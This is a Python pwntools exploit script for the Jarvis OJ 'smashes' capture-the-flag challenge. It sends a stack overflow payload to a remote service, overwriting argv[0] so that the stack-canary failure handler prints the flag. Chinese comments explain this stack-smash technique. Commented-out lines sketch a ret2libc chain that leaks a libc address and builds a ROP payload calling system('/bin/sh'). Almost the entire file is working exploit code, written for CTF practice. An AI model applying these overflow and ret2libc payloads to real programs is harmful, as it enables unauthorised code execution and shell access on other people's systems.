#!/usr/bin/env python
# coding=utf-8
from pwn import *
from LibcSearcher import *
nc='pwn.jarvisoj.com'
point = 9877
#p= ELF('./smashes.44838f6edd4408a53feb2e2bbfe5b229 ')
#a= process('./smashes.44838f6edd4408a53feb2e2bbfe5b229')
#a = remote("localhost", 12345)
a = remote(nc,point)

'''
在程序加了 canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，
程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧
则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启
动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 __stack_
chk_fail 函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指
向了程序名

所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，
那么在 __fortify_fail 函数中就会输出我们想要的信息
'''
#pop_rdi_ret = 0x4006b3
#pop_rsi_pop_r15_ret=0x4006b1
argv_addr = 0x7ffd97b13578 #程序名地址
name_addr = 0x7ffd97b13360 	#调用 __IO_gets 之前的 rsp
another_flag_addr = 0x400d20
payload = 'a'*(argv_addr-name_addr)+p64(another_flag_addr)



print(len(payload))
a.recvuntil('name? ')
a.sendline(payload)
a.recvuntil('flag: ')
#payload +=p64(print_addr)
#payload +=p64(print_addr)
#payload+=p64(pop_rdi_ret)
#payload+=p64(1)
#payload+=p64(pop_rsi_pop_r15_ret)
#payload+=p64(p.got['read'])
#payload+=p64(4)
#payload+=p64(p.plt['write'])
#payload+=p64(0x4005E6)

#payload = ''
#payload+=junk
#payload+=p32(0x08048320)+p32(0x08048320)+p32(addr1)
#p.send(payload)

#a.recvline()

#v = a.recv()
#print('---------------------')
#addr=(u64(v[:8]))
#print (addr)
#print('---------------------')
#libc = ELF('./libc-2.19.so')
#libc=LibcSearcher("read", addr)
#libc_base = addr - libc.symbols['read']
#print hex(libc_base)
#print hex(addr)
#system_addr = libc_base + libc.symbols['system']
#binsh_addr = libc_base + libc.search('/bin/sh\x00').next()
#print hex(binsh_addr)
#payload ='A' * 136+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)
#a.send(payload)
a.interactive()

